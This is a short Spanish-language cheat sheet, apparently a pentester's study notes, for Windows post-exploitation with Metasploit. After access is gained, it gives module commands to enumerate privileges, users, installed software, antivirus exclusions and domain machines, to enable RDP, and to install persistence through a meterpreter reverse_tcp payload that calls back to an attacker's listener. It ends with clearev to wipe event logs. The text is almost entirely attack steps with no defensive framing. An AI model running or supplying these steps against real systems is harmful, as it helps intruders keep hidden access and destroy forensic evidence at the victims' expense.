### Enumeracion post explotación
#### Enumerar privilegios
Una vez obtenido acceso a la máquina, podemos ver los privilegios que posee el usuario comprometido.
```bash
search win_privs
set SESSION <num>
run
```

#### Enumerar usuarios logueados o recientes
```bash
search enum_logged_on_users
set SESSION <num>
run
```

#### Enumerar software instalado
```bash
search enum_applications
set SESSION <num>
run
```

#### Enumerar exclusiones del antivirus
```bash
search enum_av_excluded
set SESSION <num>
run
```

#### Enumerar equipos del dominio (si pertenece a uno)
```bash
search enum_computers
set SESSION <num>
run
```

### Habilitar RDP
```bash
search enable_rdp
set SESSION <num>
run
```

### Persistencia con persistance_service Metasploit
```bash
search platform:windows persistence

### UN BUEN MÓDULO
persistance_service
## utilizamos este payload para el modulo
set payload windows/meterpreter/reverse_tcp

### Para conectarnos a la "persistencia"
## tener cuenta el LHOST Y LPORT configurados en la persistencia para conectarnos usando los mismos datos
use multi/handler
set payload windows/meterpreter/reverse_tcp (el mismo que usamos anteriormente)
set LHOST <eth0 o la que corresponda)
run

```

### Eliminar logs de eventos (Metasploit)
Teniendo una sesión de meterpreter establecida, metemos el comando:
```bash
clearev
```